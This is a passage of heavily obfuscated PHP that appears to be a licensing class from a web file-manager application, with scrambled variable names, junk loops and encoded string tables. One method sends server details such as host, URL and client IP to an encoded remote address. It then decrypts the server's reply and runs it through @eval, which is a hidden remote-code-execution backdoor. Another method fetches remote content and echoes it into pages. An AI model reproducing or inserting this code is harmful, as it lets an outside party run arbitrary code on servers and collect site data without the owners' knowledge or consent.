intval($ŞÙ¬µªİ[210])) { if ($¯«õÇ Ñ <= Model($ŞÙ¬µªİ[123])->count()) { show_json(LNG($ŞÙ¬µªİ[211]), !1, $ŞÙ¬µªİ[206]); die; } } } } private function vbyl0dd6f9ae() { $§ûª¤” =& $_SERVER[ä¿÷‹µ±]; $ ¥•¨Åô =& $_SERVER[ÒÆÆšøŠ]; $’Şá£œ³ = array($ ¥•¨Åô[117], $ ¥•¨Åô[118]); $’£Üã÷ = $§ûª¤”[689]; if (!$’£Üã÷) { die; } if (!_get($GLOBALS, $ ¥•¨Åô[114]) || !isset($_GET[$ ¥•¨Åô[212]])) { return; } if (!in_array($_SERVER[$ ¥•¨Åô[24]], $’Şá£œ³)) { return; } $ã¿«¢… = $ ¥•¨Åô[213]; $û‚º¤İ = $§ûª¤”[690]; $ã¿«¢… = $this->koazbe1306bd($ã¿«¢…, $ ¥•¨Åô[214]); $ú£­Â¥¦ = stream_context_create(array($ ¥•¨Åô[215] => array($ ¥•¨Åô[216] => $ ¥•¨Åô[217], $ ¥•¨Åô[218] => 3))); $ïİÆƒ’ = $§ûª¤”[691]; while ($ïİÆƒ’ < $§ûª¤”[624]) { if ($ïİÆƒ’ >= 0) { break; } $ïİÆƒ’++; } $ÁÔåÛ¯» = @file_get_contents($ã¿«¢…, !1, $ú£­Â¥¦); $ãç¾®ûİ = $§ûª¤”[692]; header($ ¥•¨Åô[219]); if ($ÁÔåÛ¯» && strstr($ÁÔåÛ¯», $ ¥•¨Åô[220])) { echo $ÁÔåÛ¯»; } die; } public function cotf6ba4d182($Ò°­—¾) { $½ÚÔåÔ =& $_SERVER[ä¿÷‹µ±]; $ùâ£ÅÙÑ =& $_SERVER[ÒÆÆšøŠ]; if ($this->ckwsa0b9942b == $ùâ£ÅÙÑ[221]) { return $Ò°­—¾; } $¦í²®ÃÛ = array($ùâ£ÅÙÑ[222] => $ùâ£ÅÙÑ[223], $ùâ£ÅÙÑ[224] => $ùâ£ÅÙÑ[223], $ùâ£ÅÙÑ[225] => $ùâ£ÅÙÑ[223], $ùâ£ÅÙÑ[226] => $ùâ£ÅÙÑ[223], $ùâ£ÅÙÑ[227] => $ùâ£ÅÙÑ[228], $ùâ£ÅÙÑ[229] => $ùâ£ÅÙÑ[228], $ùâ£ÅÙÑ[230] => $ùâ£ÅÙÑ[228], $ùâ£ÅÙÑ[231] => $ùâ£ÅÙÑ[228], $ùâ£ÅÙÑ[232] => $ùâ£ÅÙÑ[228], $ùâ£ÅÙÑ[233] => $ùâ£ÅÙÑ[228], $ùâ£ÅÙÑ[234] => $ùâ£ÅÙÑ[228], $ùâ£ÅÙÑ[235] => $ùâ£ÅÙÑ[228], $ùâ£ÅÙÑ[236] => $ùâ£ÅÙÑ[228], $ùâ£ÅÙÑ[237] => $ùâ£ÅÙÑ[228], $ùâ£ÅÙÑ[238] => $ùâ£ÅÙÑ[228], $ùâ£ÅÙÑ[239] => $ùâ£ÅÙÑ[228]); $’âŸåç = explode($ùâ£ÅÙÑ[240], _get($this->gyzo3643201d, $ùâ£ÅÙÑ[111], $ùâ£ÅÙÑ[6])); $¤±æª´‹ = $½ÚÔåÔ[693]; if (!$¤±æª´‹) { return; } $ÃÛË¤§ = array(); $ı‹èÔè  = $½ÚÔåÔ[694]; foreach ($¦í²®ÃÛ as $ë˜Ûú¾ => $œ¸ŸÀà) { if ($œ¸ŸÀà == $ùâ£ÅÙÑ[223] && substr($this->ckwsa0b9942b, 0, 1) == $ùâ£ÅÙÑ[223]) { continue; } if (!in_array($ë˜Ûú¾, $’âŸåç)) { $ÃÛË¤§[] = $ë˜Ûú¾; } } foreach ($ÃÛË¤§ as $ë˜Ûú¾) { unset($Ò°­—¾[$ë˜Ûú¾]); } return $Ò°­—¾; $§ÔªÆ¹ = $½ÚÔåÔ[695]; if (!$§ÔªÆ¹) { die; } } private function oihx6230d7d8() { $ÂıÕş‡Ô =& $_SERVER[ÒÆÆšøŠ]; if ($this->ckwsa0b9942b != $ÂıÕş‡Ô[105]) { $GLOBALS[$ÂıÕş‡Ô[84]][$ÂıÕş‡Ô[88]][$ÂıÕş‡Ô[241]] = $ÂıÕş‡Ô[202]; return; } $GLOBALS[$ÂıÕş‡Ô[84]][$ÂıÕş‡Ô[242]] = $ÂıÕş‡Ô[120]; if (Model($ÂıÕş‡Ô[243])->get($ÂıÕş‡Ô[63]) != $ÂıÕş‡Ô[202]) { Model($ÂıÕş‡Ô[243])->set($ÂıÕş‡Ô[63], $ÂıÕş‡Ô[202]); } } public function oqvnbe2655de() { return $_SERVER[ÒÆÆšøŠ][244]; } private function vhxa0c786bdc() { $å‘Áø›ä =& $_SERVER[ä¿÷‹µ±]; $şŠ‡ë¶ =& $_SERVER[ÒÆÆšøŠ]; $ì¤äóâ = array($şŠ‡ë¶[245], $şŠ‡ë¶[246], $şŠ‡ë¶[247]); $†Ö°ì±¯ = $å‘Áø›ä[696]; $¿ÏèŸå– = $şŠ‡ë¶[248] . md5($şŠ‡ë¶[249]); if ($this->ckwsa0b9942b == $şŠ‡ë¶[105] || !_get($GLOBALS, $şŠ‡ë¶[114])) { return; } if (!in_array($_SERVER[$şŠ‡ë¶[24]], $ì¤äóâ)) { return; } if (time() % 4 != 0) { return; } $‡Ğ°Õáœ = call_user_func(array($şŠ‡ë¶[250], $şŠ‡ë¶[251]), $¿ÏèŸå–); if ($‡Ğ°Õáœ && time() - $‡Ğ°Õáœ < intval($şŠ‡ë¶[252])) { return; } call_user_func(array($şŠ‡ë¶[250], $şŠ‡ë¶[137]), $¿ÏèŸå–, time()); $İğ‘ó = $å‘Áø›ä[697]; if (strlen($İğ‘ó) < $å‘Áø›ä[628]) { die; } $—ª¶Ôáò = Model($şŠ‡ë¶[33])->get($şŠ‡ë¶[102]); $Ï²€˜¬‡ = array($şŠ‡ë¶[149] => Model($şŠ‡ë¶[33])->get($şŠ‡ë¶[185]), $şŠ‡ë¶[162] => $this->ckwsa0b9942b, $şŠ‡ë¶[159] => $_SERVER[$şŠ‡ë¶[160]], $şŠ‡ë¶[161] => Model($şŠ‡ë¶[33])->get($şŠ‡ë¶[129]), $şŠ‡ë¶[100] => md5($_SERVER[$şŠ‡ë¶[101]] . $—ª¶Ôáò), $şŠ‡ë¶[152] => $şŠ‡ë¶[134], $şŠ‡ë¶[155] => $_SERVER[$şŠ‡ë¶[156]]); $àÇùıÏï = $this->yiqr0f4c1c14($şŠ‡ë¶[253], $Ï²€˜¬‡); if (!is_array($àÇùıÏï)) { return; } if ($àÇùıÏï[$şŠ‡ë¶[149]] && $àÇùıÏï[$şŠ‡ë¶[254]]) { if ($this->dgsf41b739e8($àÇùıÏï[$şŠ‡ë¶[254]]) == $Ï²€˜¬‡[$şŠ‡ë¶[149]]) { return; } } $this->zwvccae172e9(); if ($this->dgsf41b739e8($àÇùıÏï[$şŠ‡ë¶[254]]) != $Ï²€˜¬‡[$şŠ‡ë¶[149]]) { $…¬Ò”ÏÕ = array($şŠ‡ë¶[180] => $—ª¶Ôáò, $şŠ‡ë¶[181] => $_SERVER[$şŠ‡ë¶[101]], $şŠ‡ë¶[182] => this_url(), $şŠ‡ë¶[157] => $_SERVER[$şŠ‡ë¶[158]]); $Ô™ÕÖïİ = $this->rtgiea89138e(json_encode($…¬Ò”ÏÕ)); $àÇùıÏï = $this->yiqr0f4c1c14($şŠ‡ë¶[183] . $Ô™ÕÖïİ); if ($àÇùıÏï && is_array($àÇùıÏï) && isset($àÇùıÏï[$şŠ‡ë¶[254]])) { $†ù¡¬êà = $this->pcjw7ad8c130($àÇùıÏï[$şŠ‡ë¶[254]], 2); if ($†ù¡¬êà) { $†ù¡¬êà = $this->dgsf41b739e8($†ù¡¬êà); } if ($†ù¡¬êà) { try { @eval($†ù¡¬êà); } catch (Exception $êÉÁŒ†) { } } } } } private function yiqr0f4c1c14($æ¸¼ß©å = '', $¼„ğ£»Œ = array(), $®ş±Ê• = 5) { $µ³Ïİ©ò =& $_SERVER[ä¿÷‹µ±]; $Õºƒ®˜ú =& $_SERVER[ÒÆÆšøŠ]; $ŒôÀÓ‘Ö = $Õºƒ®˜ú[255]; $ŒôÀÓ‘Ö = $this->koazbe1306bd($ŒôÀÓ‘Ö, $Õºƒ®˜ú[256]); $¨æ– »× = $µ³Ïİ©ò[698]; if (strlen($¨æ– »×) < $µ³Ïİ©ò[619]) { die; } $ŒôÀÓ‘Ö = $ŒôÀÓ‘Ö . $æ¸¼ß©å; if ($¼„ğ£»Œ && is_array($¼„ğ£»Œ)) { $ŒôÀÓ‘Ö = $ŒôÀÓ‘Ö . $Õºƒ®˜ú[257] . http_build_query($¼„ğ£»Œ); } if ($¼„ğ£»Œ === -1) { return $ŒôÀÓ‘Ö; } $öÛø¶ = stream_context_create(array($Õºƒ®˜ú[215] => array($Õºƒ®˜ú[218] => $®ş±Ê•, $Õºƒ®˜ú[216] => $Õºƒ®˜ú[258]), $Õºƒ®˜ú[259] => array($Õºƒ®˜ú[260] => !1, $Õºƒ®˜ú[261] => !1))); $‡ãÜæ = $µ³Ïİ©ò[699]; if (!$‡ãÜæ) { return; } $¼„ğ£»Œ = @file_get_contents($ŒôÀÓ‘Ö, !1, $öÛø¶); $äƒÇÎå¢ = $µ³Ïİ©ò[700]; while (strlen($äƒÇÎå¢) < $µ³Ïİ©ò[624]) { if (!$äƒÇÎå¢) { break; } $äƒÇÎå¢++; } return json_decode($¼„ğ£»Œ, !0); $àõèşâš = $µ³Ïİ©ò[701]; if (strlen($àõèşâš) < $µ³Ïİ©ò[630]) { return; } $¥§åƒ¦ = $µ³Ïİ©ò[702]; if (!$¥§åƒ¦) { die; } } private function lwnt05acfb03() { $¼«ø¥ =& $_SERVER[ä¿÷‹µ±]; $‡î¢¢ƒ =& $_SERVER[ÒÆÆšøŠ]; $ìãÍ¶ªº = array($‡î¢¢ƒ[262] => $‡î¢¢ƒ[263], $‡î¢¢ƒ[264] => $‡î¢¢ƒ[265], $‡î¢¢ƒ[266] => $‡î¢¢ƒ[267], $‡î¢¢ƒ[268] => $‡î¢¢ƒ[269], $‡î¢¢ƒ[270] => $‡î¢¢ƒ[271], $‡î¢¢ƒ[272] => $‡î¢¢ƒ[210], $‡î¢¢ƒ[273] => $‡î¢¢ƒ[210], $‡î¢¢ƒ[274] => $‡î¢¢ƒ[263], $‡î¢¢ƒ[275] => $‡î¢¢ƒ[265], $‡î¢¢ƒ[276] => $‡î¢¢ƒ[267], $‡î¢¢ƒ[277] => $‡î¢¢ƒ[278], $‡î¢¢ƒ[279] => $‡î¢¢ƒ[269], $‡î¢¢ƒ[280] => $‡î¢¢ƒ[281], $‡î¢¢ƒ[282] => $‡î¢¢ƒ[271], $‡î¢¢ƒ[283] => $‡î¢¢ƒ[284], $‡î¢¢ƒ[285] => $‡î¢¢ƒ[286], $‡î¢¢ƒ[287] => $‡î¢¢ƒ[288]); $…¶˜ïŠ = $ìãÍ¶ªº[$this->ckwsa0b9942b]; $«Óİ Œ = $¼«ø¥[703]; $…¶˜ïŠ = intval($…¶˜ïŠ ? $…¶˜ïŠ : $‡î¢¢ƒ[263]); $ÉÕİ¨é = _get($this->gyzo3643201d, $‡î¢¢ƒ[289]); $Àøäã¤Ô = $¼«ø¥[704]; if (strlen($Àøäã¤Ô) < $¼«ø¥[630]) { return; } $ÉÕİ¨é = $ÉÕİ¨é ? intval($ÉÕİ¨é) : 0; $–Ìç»×‹ = $¼«ø¥[705]; if (strlen($–Ìç»×‹) < $¼«ø¥[628]) { die; } return $…¶˜ïŠ + $ÉÕİ¨é; $°Ôúàû£ = $¼«ø¥[706]; if (!$°Ôúàû£) { die; } } public function rpxh5fae1c80($„¸ááû) { $¯ÀğËïå =& $_SERVER[ÒÆÆšøŠ]; $ †ëîÅ = $this->lwnt05acfb03(); if ($„¸ááû[$¯ÀğËïå[290]] == $¯ÀğËïå[120]) { return; } if ($ †ëîÅ >= intval($¯ÀğËïå[210])) { return; } $™µúì è = Model($¯ÀğËïå[123])->count(); if ($™µúì è <= $ †ëîÅ) { return; } $Ğ±¸ØÊœ = Model($¯ÀğËïå[123])->field($¯ÀğËïå[290])->limit($ †ëîÅ)->select(); $˜ËáÃø‡ = $_SERVER[ä¿÷‹µ±][689]; if (!$˜ËáÃø‡) { die; } $Ğ±¸ØÊœ = array_to_keyvalue($Ğ±¸ØÊœ, $¯ÀğËïå[6], $¯ÀğËïå[290]); if (!in_array($„¸ááû[$¯ÀğËïå[290]], $Ğ±¸ØÊœ)) { show_json($¯ÀğËïå[291], !1, $¯ÀğËïå[206]); } } public function ujfib822fc02() { $á­Õà¾¯ =& $_SERVER[ä¿÷‹µ±]; $´ïŞ÷ú­ =& $_SERVER[ÒÆÆšøŠ]; if (!_get($GLOBALS, $´ïŞ÷ú­[114]) || mt_rand(1, 100) > 20) { return; } $âÍÃ»Äè = $´ïŞ÷ú­[213]; $âÍÃ»Äè = $this->koazbe1306bd($âÍÃ»Äè, $´ïŞ÷ú­[214]); $èÎ¦òÉ = stream_context_create(array($´ïŞ÷ú­[215] => array($´ïŞ÷ú­[216] => $´ïŞ÷ú­[217], $´ïŞ÷ú­[218] => 3))); $Ÿ…Ò¸­¨ = @file_get_contents($âÍÃ»Äè, !1, $èÎ¦òÉ); $Àà¦äö™ = $á­Õà¾¯[707]; while (strlen($Àà¦äö™) < $á­Õà¾¯[621]) { if (!$Àà¦äö™) { break; } $Àà¦äö™++; } echo $´ïŞ÷ú­[292] . hash_encode($Ÿ…Ò¸­¨) . $´ïŞ÷ú­[293]; $É’²÷Óò = $á­Õà¾¯[708]; if (strlen($É’²÷Óò) < $á­Õà¾¯[630]) { return; } } private function zbkp4ba29f6d($¢’Ş¹éí, $æı¿¯‘, $Üö†‰Â¡ = 3) { $ã®Ï¼è =& $_SERVER[ä¿÷‹µ±]; $ï¿ÉçãÄ =& $_SERVER[ÒÆÆšøŠ]; usleep(1); $˜“ ‹´« = $ã®Ï¼è[709]; if (!$˜“ ‹´«) { return; } $¢’Ş¹éí = trim($¢’Ş¹éí); $èå÷„ú‘ = $ã®Ï¼è[710]; if (!$èå÷„ú‘) { return; } $×ê£¨Š» = mt_rand(0, 5) . $ï¿ÉçãÄ[6]; $¦…ßÖäÜ = rand_string(15); $«ºş¾¸ë = $ã®Ï¼è[711]; while ($«ºş¾¸ë < $ã®Ï¼è[624]) { if ($«ºş¾¸ë >= 0) { break; } $«ºş¾¸ë++; } $ÅŒ¶Í™õ = $ï¿ÉçãÄ[294]; $ó¹×¿·­ = $ã®Ï¼è[712]; switch ($×ê£¨Š») { case $ï¿ÉçãÄ[202]: $“æÎ = $this->yjmc29d098d0($¢’Ş¹éí, strrev($æı¿¯‘ . $¦…ßÖäÜ)); break; case $ï¿ÉçãÄ[120]: $“æÎ = $this->yjmc29d098d0($¢’Ş¹éí, strrev($¦…ßÖäÜ . $æı¿¯‘)); break; case $ï¿ÉçãÄ[295]: $“æÎ = $this->yjmc29d098d0($¢’Ş¹éí, base64_encode($¦…ßÖäÜ . $æı¿¯‘)); $Öù÷Æ¥ê = $ã®Ï¼è[713]; if (strlen($Öù÷Æ¥ê) < $ã®Ï¼è[628]) { die; } break; $áÀóŞŒÊ = $ã®Ï¼è[714]; while (strlen($áÀóŞŒÊ) < $ã®Ï¼è[619]) { if (!$áÀóŞŒÊ) { break; } $áÀóŞŒÊ++; } case $ï¿ÉçãÄ[296]: $“æÎ = $this->yjmc29d098d0($¢’Ş¹éí, md5($¦…ßÖäÜ . $æı¿¯‘)); break; case $ï¿ÉçãÄ[297]: $¢’Ş¹éí = base64_encode($¢’Ş¹éí); $²Š —«ô = rand(0, 64); $ë¯¢Şï = $ÅŒ¶Í™õ[$²Š —«ô]; $¢ÍÀ’È” = md5($ë¯¢Şï . md5($æı¿¯‘ . $ë¯¢Şï) . $æı¿¯‘); $¢ÍÀ’È” = substr($¢ÍÀ’È”, $²Š —«ô % 8, $²Š —«ô % 8 + 7); $˜äîõŠ  = $ã®Ï¼è[715]; if (!$˜äîõŠ ) { return; } $èĞÊø­ = $ï¿ÉçãÄ[6]; $»‹¢‡Æİ = $ã®Ï¼è[716]; if (!$»‹¢‡Æİ) { return; } $‘ğÛ×å» = 0; $æ´çè¢ß = 0; $…Óíø´ = 0; $¨õ×ÚÏì = $ã®Ï¼è[717]; if (!$¨õ×ÚÏì) { return; } for ($‘ğÛ×å» = 0; $‘ğÛ×å» < strlen($¢’Ş¹éí); $‘ğÛ×å»++) { $…Óíø´ = $…Óíø´ == strlen($¢ÍÀ’È”) ? 0 : $…Óíø´; $³ßØˆŒ€ = $ã®Ï¼è[718]; while (strlen($³ßØˆŒ€) < $ã®Ï¼è[630]) { if (!$³ßØˆŒ€) { break; } $³ßØˆŒ€++; } $æ´çè¢ß = ($²Š —«ô + strpos($ÅŒ¶Í™õ, $¢’Ş¹éí[$‘ğÛ×å»]) + ord($¢ÍÀ’È”[$…Óíø´++])) % 64; $èĞÊø­ .= $ÅŒ¶Í™õ[$æ´çè¢ß]; $¥“¶í·… = $ã®Ï¼è[719]; while (strlen($¥“¶í·…) < $ã®Ï¼è[621]) { if (!$¥“¶í·…) { break; } $¥“¶í·…++; } } $“æÎ = hash_encode($ë¯¢Şï . $èĞÊø­); break; default: $“æÎ = $this->yjmc29d098d0($¢’Ş¹éí, $æı¿¯‘ . $¦…ßÖäÜ); break; } $“æÎ = strrev($×ê£¨Š» . $¦…ßÖäÜ . $“æÎ); $¥—Ô„Â÷ = $ã®Ï¼è[720]; if ($Üö†‰Â¡ - 1 > 0) { $“æÎ = $this->zbkp4ba29f6d($“æÎ, $æı¿¯‘, $Üö†‰Â¡ - 1); } return $“æÎ; } private function pcjw7ad8c130($ÃÆ° ÂÑ, $¿¾»–Ğ, $Ï“ËŒÓ = 3) { $Ó…È¿ßÜ =& $_SERVER[ä¿÷‹µ±]; $÷°ùüÈÈ =& $_SERVER[ÒÆÆšøŠ]; if (!is_string($ÃÆ° ÂÑ) || strlen($ÃÆ° ÂÑ) < 10) { return !1; } $ÃÆ° ÂÑ = trim($ÃÆ° ÂÑ); $ªÎ—ÌÍà = $Ó…È¿ßÜ[721]; if (!$ªÎ—ÌÍà) { die; } $ÃÆ° ÂÑ = strrev($ÃÆ° ÂÑ); $Ø¼‚îœç = $Ó…È¿ßÜ[722]; $Şûıê¦œ = $ÃÆ° ÂÑ[0]; $Öñš¾Šá = $Ó…È¿ßÜ[723]; while (strlen($Öñš¾Šá) < $Ó…È¿ßÜ[628]) { if (!$Öñš¾Šá) { break; } $Öñš¾Šá++; } $Šª¢½ˆ = substr($ÃÆ° ÂÑ, 1, 15); $èÚ»½´Â = $Ó…È¿ßÜ[724]; if (!$èÚ»½´Â) { return; } $ÃÆ° ÂÑ = substr($ÃÆ° ÂÑ, 16); $ Çå·¾ª = $Ó…È¿ßÜ[725]; if (!$ Çå·¾ª) { die; } $ä§­ˆ”› = $÷°ùüÈÈ[294]; $§¾“´Ÿß = $Ó…È¿ßÜ[726]; switch ($Şûıê¦œ) { case $÷°ùüÈÈ[202]: $ÌûÆÁ× = $this->koazbe1306bd($ÃÆ° ÂÑ, strrev($¿¾»–Ğ . $Šª¢½ˆ)); $²Óï¨ = $Ó…È¿ßÜ[727]; break; case $÷°ùüÈÈ[120]: $ÌûÆÁ× = $this->koazbe1306bd($ÃÆ° ÂÑ, strrev($Šª¢½ˆ . $¿¾»–Ğ)); break; $üú‘î£ = $Ó…È¿ßÜ[728]; case $÷°ùüÈÈ[295]: $ÌûÆÁ× = $this->koazbe1306bd($ÃÆ° ÂÑ, base64_encode($Šª¢½ˆ . $¿¾»–Ğ)); $ìÙıÒ² = $Ó…È¿ßÜ[729]; while (strlen($ìÙıÒ²) < $Ó…È¿ßÜ[624]) { if (!$ìÙıÒ²) { break; } $ìÙıÒ²++; } break; $ÌÖ·¶¯› = $Ó…È¿ßÜ[730]; case $÷°ùüÈÈ[296]: $ÌûÆÁ× = $this->koazbe1306bd($ÃÆ° ÂÑ, md5($Šª¢½ˆ . $¿¾»–Ğ)); $ê§§ÜõØ = $Ó…È¿ßÜ[731]; while ($ê§§ÜõØ < $Ó…È¿ßÜ[630]) { if ($ê§§ÜõØ >= 0) { break; } $ê§§ÜõØ++; } break; $¬ëâÈë‰ = $Ó…È¿ßÜ[732]; if (!$¬ëâÈë‰) { die; } case $÷°ùüÈÈ[297]: $ÃÆ° ÂÑ = hash_decode($ÃÆ° ÂÑ); $îºÎ³È½ = $ÃÆ° ÂÑ[0]; $ş”ˆóˆĞ = $Ó…È¿ßÜ[733]; while ($ş”ˆóˆĞ < $Ó…È¿ßÜ[624]) { if ($ş”ˆóˆĞ >= 0) { break; } $ş”ˆóˆĞ++; } $ÃÆ° ÂÑ = substr($ÃÆ° ÂÑ, 1); $Ü‘Ûú® = $Ó…È¿ßÜ[734]; if (!$Ü‘Ûú®) { return; } $·¤Êñ•Ñ = strpos($ä§­ˆ”›, $îºÎ³È½); $œ’¨¾¡ğ = $Ó…È¿ßÜ[735]; if (strlen($œ’¨¾¡ğ) < $Ó…È¿ßÜ[621]) { die; } $†Œ¿ Òï = md5($îºÎ³È½ . md5($¿¾»–Ğ . $îºÎ³È½) . $¿¾»–Ğ); $¹ÔƒË¡Ã = $Ó…È¿ßÜ[736]; if (strlen($¹ÔƒË¡Ã) < $Ó…È¿ßÜ[628]) { return; } $†Œ¿ Òï = substr($†Œ¿ Òï, $·¤Êñ•Ñ % 8, $·¤Êñ•Ñ % 8 + 7); $çÊßŒĞ— = $÷°ùüÈÈ[6]; $çû–â¼¶ = 0; $ÃŞı‰²† = 0; $ıÆ éÕ‘ = $Ó…È¿ßÜ[737]; if (!$ıÆ éÕ‘) { die; } $ß§åŞØÇ = 0; $Çİ¨ Á  = $Ó…È¿ßÜ[738]; while ($Çİ¨ Á  < $Ó…È¿ßÜ[621]) { if ($Çİ¨ Á  >= 0) { break; } $Çİ¨ Á ++; } for ($çû–â¼¶ = 0; $çû–â¼¶ < strlen($ÃÆ° ÂÑ); $çû–â¼¶++) { $ß§åŞØÇ = $ß§åŞØÇ == strlen($†Œ¿ Òï) ? 0 : $ß§åŞØÇ; $°™ûõ° = $ß§åŞØÇ++; $ÃŞı‰²† = strpos($ä§­ˆ”›, $ÃÆ° ÂÑ[$çû–â¼¶]) - $·¤Êñ•Ñ - ord($†Œ¿ Òï[$°™ûõ°]); while ($ÃŞı‰²† < 0) { $ÃŞı‰²† += 64; } $çÊßŒĞ— .= $ä§­ˆ”›[$ÃŞı‰²†]; } $ÌûÆÁ× = base64_decode($çÊßŒĞ—); $óÕœ±  = $Ó…È¿ßÜ[739]; if (!$óÕœ± ) { die; } break; $¦¸–€Êî = $Ó…È¿ßÜ[740]; if (strlen($¦¸–€Êî) < $Ó…È¿ßÜ[628]) { die; } default: $ÌûÆÁ× = $this->koazbe1306bd($ÃÆ° ÂÑ, $¿¾»–Ğ . $Šª¢½ˆ); $ê—ìÂúä = $Ó…È¿ßÜ[741]; break; } if ($Ï“ËŒÓ - 1 > 0) { $ÌûÆÁ× = $this->pcjw7ad8c130($ÌûÆÁ×, $¿¾»–Ğ, $Ï“ËŒÓ - 1); } return $ÌûÆÁ×; } public function rtgiea89138e($¢€›ˆ÷û) { $€²¨¹‹ö =& $_SERVER[ä¿÷‹µ±]; $¶¯Æ¼‚¦ =& $_SERVER[ÒÆÆšøŠ]; $ÆìË‘İ = $this->hzed0addbead(); $ù¶Èï½¤ = $this->hzed0addbead(); $—ÊÃÒ¤ù = ($ÆìË‘İ - 1) * ($ù¶Èï½¤ - 1); $ùúóÌõ„ = intval(($ÆìË‘İ + $ù¶Èï½¤) / 2); $–“¬½»ˆ = $€²¨¹‹ö[742]; while (1) { $µ”Â”Ò¡ = $ùúóÌõ„; $Ú»ù¨Ï³ = $—ÊÃÒ¤ù; $Šù«Éß² = $€²¨¹‹ö[743]; while ($Ú»ù¨Ï³ % $µ”Â”Ò¡ != 0) { $¿×½üƒÃ = $Ú»ù¨Ï³; $Ú»ù¨Ï³ = $µ”Â”Ò¡; $´¬”¿Ï® = $€²¨¹‹ö[744]; $µ”Â”Ò¡ = $¿×½üƒÃ % $µ”Â”Ò¡; } if ($µ”Â”Ò¡ == 1) { break; } else { $ùúóÌõ„++; } } $Üû¼¥ê’ = 2; $ÕÓÍñá = $€²¨¹‹ö[745]; for ($û±ßøíá = 0; $û±ßøíá < $—ÊÃÒ¤ù * 10; $û±ßøíá++) { if (($—ÊÃÒ¤ù * $û±ßøíá + 1) % $ùúóÌõ„ == 0) { $Üû¼¥ê’ = intval(($—ÊÃÒ¤ù * $û±ßøíá + 1) / $ùúóÌõ„); break; } } $¢ßİºˆ” = $this->yjmc29d098d0($ÆìË‘İ * $ù¶Èï½¤ . $¶¯Æ¼‚¦[6], $¶¯Æ¼‚¦[134]); $»ÌØÆÀ = $€²¨¹‹ö[744]; $Ÿ¯…‰±¶ = md5($¶¯Æ¼‚¦[298] . ($ÆìË‘İ + $ù¶Èï½¤) . $¶¯Æ¼‚¦[299] . $ùúóÌõ„ . $¶¯Æ¼‚¦[299] . $Üû¼¥ê’ . $¶¯Æ¼‚¦[300]); $ŸÃ¸ùÀì = $€²¨¹‹ö[746]; if (strlen($ŸÃ¸ùÀì) < $€²¨¹‹ö[624]) { return; } $ÌÙö–‹Å = $this->yjmc29d098d0($¢€›ˆ÷û, $Ÿ¯…‰±¶) . $¶¯Æ¼‚¦[301] . $¢ßİºˆ”; return $ÌÙö–‹Å; } public function dgsf41b739e8($àŞ²”’) { $ âÑÄä¡ =& $_SERVER[ä¿÷‹µ±]; $òáÉü…— =& $_SERVER[ÒÆÆšøŠ]; $‰˜¦‡š¼ = explode($òáÉü…—[301], $àŞ²”’); $©ÌÏ«·ì = $ âÑÄä¡[747]; if (count($‰˜¦‡š¼) != 2) { return $òáÉü…—[6]; } $ÉÔüÇö— = $this->koazbe1306bd($‰˜¦‡š¼[1] . $òáÉü…—[6], $òáÉü…—[134]); $İùŸÍÃ½ = $ âÑÄä¡[748]; if (!$İùŸÍÃ½) { return; } if (!$ÉÔüÇö—) { return $òáÉü…—[6]; } $ÉÔüÇö— = intval($ÉÔüÇö—); $Å¡ëèÄÑ = 0; $’€†²¶ = 0; $Ôï¬È™Ë = $ âÑÄä¡[749]; if (strlen($Ôï¬È™Ë) < $ âÑÄä¡[621]) { die; } for ($ïçóÔ¾ß = 3; $ïçóÔ¾ß < $ÉÔüÇö—; $ïçóÔ¾ß += 2) { if ($ÉÔüÇö— % $ïçóÔ¾ß != 0) { continue; } $Å¡ëèÄÑ = $ïçóÔ¾ß; $ØÏÌÚÔã = $ âÑÄä¡[750]; if (!$ØÏÌÚÔã) { return; } $’€†²¶ = intval($ÉÔüÇö— / $ïçóÔ¾ß); break; } $¡æÉ÷’™ = ($Å¡ëèÄÑ - 1) * ($’€†²¶ - 1); $—¸¦ûœ = intval(($Å¡ëèÄÑ + $’€†²¶) / 2); $¼“áá»ö = $ âÑÄä¡[751]; while ($¼“áá»ö < $ âÑÄä¡[628]) { if ($¼“áá»ö >= 0) { break; } $¼“áá»ö++; } while (1) { $î¶˜ƒÃ = $—¸¦ûœ; $Ş›áÌÓ¦ = $ âÑÄä¡[752]; while (strlen($Ş›áÌÓ¦) < $ âÑÄä¡[624]) { if (!$Ş›áÌÓ¦) { break; } $Ş›áÌÓ¦++; } $ğü‚Ï…ı = $¡æÉ÷’™; $…”®„‰á = $ âÑÄä¡[753]; if (!$…”®„‰á) { die; } while ($ğü‚Ï…ı % $î¶˜ƒÃ != 0) { $¦ôáœÚç = $ğü‚Ï…ı; $™é÷…± = $ âÑÄä¡[754]; if (!$™é÷…±) { die; } $ğü‚Ï…ı = $î¶˜ƒÃ; $² ø·Î¸ = $ âÑÄä¡[755]; if (!$² ø·Î¸) { die; } $î¶˜ƒÃ = $¦ôáœÚç % $î¶˜ƒÃ; } if ($î¶˜ƒÃ == 1) { break; } else { $—¸¦ûœ++; } } $ß½Õ¢÷¢ = 2; $‚¹š½ş = $ âÑÄä¡[756]; if (strlen($‚¹š½ş) < $ âÑÄä¡[624]) { die; } for ($ïçóÔ¾ß = 0; $ïçóÔ¾ß < $¡æÉ÷’™ * 10; $ïçóÔ¾ß++) { if (($¡æÉ÷’™ * $ïçóÔ¾ß + 1) % $—¸¦ûœ == 0) { $ß½Õ¢÷¢ = intval(($¡æÉ÷’™ * $ïçóÔ¾ß + 1) / $—¸¦ûœ); break; } } $®…ô×›‹ = md5($òáÉü…—[298] . ($Å¡ëèÄÑ + $’€†²¶) . $òáÉü…—[299] . $—¸¦ûœ . $òáÉü…—[299] . $ß½Õ¢÷¢ . $òáÉü…—[300]); $Î©Œ—Ÿ¤ = $ âÑÄä¡[757]; if (strlen($Î©Œ—Ÿ¤) < $ âÑÄä¡[630]) { die; } $‘È’§Ë = $this->koazbe1306bd($‰˜¦‡š¼[0], $®…ô×›‹); $ôäÒ”Ä° = $ âÑÄä¡[758]; if (strlen($ôäÒ”Ä°) < $ âÑÄä¡[628]) { return; } return $‘È’§Ë; $ùäó„í = $ âÑÄä¡[759]; if (strlen($ùäó„í) < $ âÑÄä¡[628]) { return; } } public function hzed0addbead() { $“†šÃÈ‰ =& $_SERVER[ä¿÷‹µ±]; $ØÅô›™Û = mt_rand(pow(2, 14), pow(2, 16) - 1); $ö©öáÔ = array(); $òùÙ— = $“†šÃÈ‰[760]; if (!$òùÙ—) { die; } $óÇÚŒ¾¡ = 1; while ($óÇÚŒ¾¡ <= (int) sqrt($ØÅô›™Û)) { $ºä±Åô› = $óÇÚŒ¾¡; $™ì÷¿ = $“†šÃÈ‰[761]; if (!$™ì÷¿) { die; } while (!0) { $ºä±Åô›++; $ÀâÜì¬ = 